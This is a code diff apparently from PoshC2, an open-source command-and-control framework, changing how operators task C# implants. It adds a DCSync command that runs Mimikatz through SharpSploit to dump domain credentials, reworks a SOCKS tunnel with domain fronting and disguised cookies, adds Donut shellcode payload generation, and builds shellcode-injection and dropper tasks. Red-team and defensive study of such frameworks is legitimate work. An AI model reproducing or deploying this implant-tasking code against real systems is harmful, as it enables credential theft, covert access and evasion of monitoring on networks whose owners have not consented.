@@ -15,12 +15,11 @@ from poshc2.server.Core import print_bad, print_good
 from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
 from poshc2.server.payloads.Payloads import Payloads
 from poshc2.server.PowerStatus import getpowerstatus
-from poshc2.server.database.DB import new_task, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey, get_powerstatusbyrandomuri
+from poshc2.server.database.DB import hide_implant, new_task, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey, get_powerstatusbyrandomuri
 from poshc2.server.database.DB import select_item, update_label, get_allurls, get_c2server_all, get_newimplanturl, new_urldetails
 
 
 def handle_sharp_command(command, user, randomuri, implant_id):
-
     # alias mapping
     for alias in cs_alias:
         if alias[0] == command[:len(command.rstrip())]:
@@ -54,10 +53,13 @@ def handle_sharp_command(command, user, randomuri, implant_id):
     elif command.startswith("migrate"):
         do_migrate(user, command, randomuri)
         return
+    elif command == "kill-process":
+        do_kill_process(user, command, randomuri)
+        return        
     elif command == "kill-implant" or command == "exit":
         do_kill_implant(user, command, randomuri)
         return
-    elif command == "sharpsocks":
+    elif command.startswith("sharpsocks"):
         do_sharpsocks(user, command, randomuri)
         return
     elif (command.startswith("stop-keystrokes")):
@@ -116,6 +118,9 @@ def handle_sharp_command(command, user, randomuri, implant_id):
         return
     elif command.startswith("startdaisy"):
         do_startdaisy(user, command, randomuri)
+        return
+    elif command.startswith("dcsync"):
+        do_dcsync(user, command, randomuri)
         return
     elif command == "help":
         do_help(user, command, randomuri)
@@ -202,7 +207,6 @@ def do_inject_shellcode(user, command, randomuri):
     except Exception as e:
         print("Error loading file: %s" % e)
 
-
 def do_migrate(user, command, randomuri):
     params = re.compile("migrate", re.IGNORECASE)
     params = params.sub("", command)
@@ -226,15 +230,26 @@ def do_migrate(user, command, randomuri):
     new_task("run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
 
 
-def do_kill_implant(user, command, randomuri):
+def do_kill_process(user, command, randomuri):
     impid = get_implantdetails(randomuri)
+    print_bad("**OPSEC Warning** - kill-process will terminate the entire process, if you want to kill the thread only use kill-implant")
     ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
     if ri.lower() == "n":
         print("Implant not terminated")
-    if ri == "":
-        new_task("exit", user, randomuri)
+    if ri == "" or ri.lower() == "y":
+        pid = impid.PID
+        new_task("kill-process %s" % (pid), user, randomuri)
         kill_implant(randomuri)
-    if ri.lower() == "y":
+
+
+def do_kill_implant(user, command, randomuri):
+    impid = get_implantdetails(randomuri)
+    print_bad("**OPSEC Warning** - kill-implant terminates the current threat not the entire process, if you want to kill the process use kill-process")
+    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
+    if ri.lower() == "n":
+        print("Implant not terminated")
+    if ri == "" or ri.lower() == "y":
+        pid = impid.PID
         new_task("exit", user, randomuri)
         kill_implant(randomuri)
 
@@ -244,30 +259,76 @@ def do_exit(user, command, randomuri):
 
 
 def do_sharpsocks(user, command, randomuri):
+    style = Style.from_dict({
+        '': '#80d130',
+    })
+
     from random import choice
-    allchar = string.ascii_letters
-    channel = "".join(choice(allchar) for x in range(25))
-    sharpkey = gen_key().decode("utf-8")
-    sharpurls = get_sharpurls()
-    sharpurls = sharpurls.split(",")
-    sharpurl = select_item("PayloadCommsHost", "C2Server").replace('"', '').split(',')[0]
-    user_agent = select_item("UserAgent", "C2Server")
-    dfheader = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
-    print("\nIf using Docker, change the SocksHost to be the IP of the PoshC2 Server not 127.0.0.1:49031")
-    print("sharpsocks -t latest -s \"-c=%s -k=%s --verbose -l=http://*:%s\"\r" % (channel, sharpkey, SocksHost.split(":")[2]) + Colours.GREEN)
-    print("\nElse\n")
-    print("sharpsocks -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN) 
-    ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
-    if ri == "":
-        if dfheader:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader, user_agent), user, randomuri)
-        else:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken  --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), user_agent), user, randomuri)
-    if ri.lower() == "y":
-        if dfheader:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken -df %s  --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), dfheader, user_agent), user, randomuri)
-        else:
-            new_task("run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 1000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken  --user-agent \"%s\"" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", ""), user_agent), user, randomuri)
+    channel = "".join(choice(string.ascii_letters) for _ in range(25))
+    sharp_key = gen_key().decode("utf-8")
+    default_sharp_urls = get_sharpurls()
+    urls_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.comma-separated-urls-history'), auto_suggest=AutoSuggestFromHistory(), style=style)
+    socks_proxy_urls = urls_prompt.prompt(f"What URIs would you like to use for SharpSocks? Default is {default_sharp_urls.replace(' ', '')}: ")
+    if not socks_proxy_urls:
+        socks_proxy_urls = default_sharp_urls
+    socks_proxy_urls = socks_proxy_urls.split(",")
+    if len(socks_proxy_urls) < 2:
+        print("Please specify at least two URIs")
+        return
+    socks_proxy_urls = [i.replace("\"", "").strip() for i in socks_proxy_urls]
+    socks_proxy_urls = [(i[1:] if i.startswith("/") else i) for i in socks_proxy_urls]
+
+    default_sharp_url = select_item("PayloadCommsHost", "C2Server").replace('"', '').split(',')[0]
+    domains_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.protocol-and-domain-history'), auto_suggest=AutoSuggestFromHistory(), style=style)
+    sharp_url = domains_prompt.prompt(f"What domain would you like to use for SharpSocks? Default is {default_sharp_url}: ")
+    if not sharp_url:
+        sharp_url = default_sharp_url
+    if not sharp_url.startswith("http"):
+        print("Please specify a protocol (http/https)")
+        return
+
+    default_host_header = get_first_dfheader(select_item("DomainFrontHeader", "C2Server"))
+    host_headers_prompt = PromptSession(history=FileHistory('%s/.host-headers-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    host_header = host_headers_prompt.prompt(f"What host header should used? Default is {default_host_header}: ")
+    if not host_header:
+        host_header = default_host_header
+
+    default_user_agent = select_item("UserAgent", "C2Server")
+    user_agent_prompt = PromptSession(history=FileHistory('%s/.user-agents-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    user_agent = user_agent_prompt.prompt(f"What user agent? Default is \"{default_user_agent}\": ")
+    if not user_agent:
+        user_agent = default_user_agent
+
+    default_beacon = "200"
+    beacon_prompt = PromptSession(history=FileHistory('%s/.beacon-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    beacon = beacon_prompt.prompt(f"What beacon interval would you like SharpSocks to use (ms)? Default: {default_beacon}ms: ")
+    if not beacon:
+        beacon = default_beacon
+    if beacon.strip().endswith("ms"):
+        beacon = beacon.replace("ms", "").strip()
+
+    server_command = f"{PoshInstallDirectory}resources/SharpSocks/SharpSocksServer/SharpSocksServer -c={channel} -k={sharp_key} -l={SocksHost} -v"
+    if " -v" in command or " --verbose" in command:
+        server_command += " --verbose"
+    server_command += "\n"
+    print(Colours.GREEN + "\nOk, run this command from your SharpSocksServer directory to launch the SharpSocks server:\n")
+    print(server_command)
+
+    task = f"run-exe SharpSocksImplant.Program SharpSocksImplant -s {sharp_url} -c {channel} -k {sharp_key} -url1 {socks_proxy_urls[0]} -url2 {socks_proxy_urls[1]} -b {beacon} -r {beacon} --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken --user-agent \"{user_agent}\""
+    if host_header:
+        task += f" -df {host_header}"
+
+    extra_args = command.replace("sharpsocks ", "").strip()
+    if extra_args:
+        task += " " + extra_args
+
+    confirm = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
+    if confirm == "" or confirm.lower() == "y":
+        new_task(task, user, randomuri)
+    else:
+        print("Aborted...")
+        return
+
     print("SharpSocks task issued, to stop SharpSocks run stopsocks")
 
 
@@ -478,19 +539,29 @@ def do_startdaisy(user, command, randomuri):
     createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")
 
     if createpayloads.lower() == "y" or createpayloads == "":
-
         name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)
 
         daisyhost = get_implantdetails(randomuri)
         proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
         C2 = get_c2server_all()
         urlId = new_urldetails(name, f"\"http://{bind_ip}:{bind_port}\"", "\"\"", proxy_url, proxy_user, proxy_pass, cred_expiry)
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone, URLID=urlId)
+        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, PowerShellProxyCommand=proxynone,
+                              URLID=urlId)
         newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
         newPayload.CreateDroppers(name)
         newPayload.CreateRaw(name)
         newPayload.CreateDlls(name)
         newPayload.CreateShellcode(name)
+        newPayload.CreateDonutShellcode(name)
         newPayload.CreateEXE(name)
         newPayload.CreateMsbuild(name)
         print_good("Created new %s daisy payloads" % name)
+
+
+def do_dcsync(user, command, randomuri):
+    params = re.compile("dcsync ", re.IGNORECASE)
+    params = params.sub("", command)
+    res = params.split()
+    domain = res[0]
+    dcsync_user = res[1]
+    new_task(f"run-dll SharpSploit.Credentials.Mimikatz SharpSploit Command \"\\\"lsadump::dcsync /domain:{domain} /user:{dcsync_user}\\\"\"", user, randomuri)
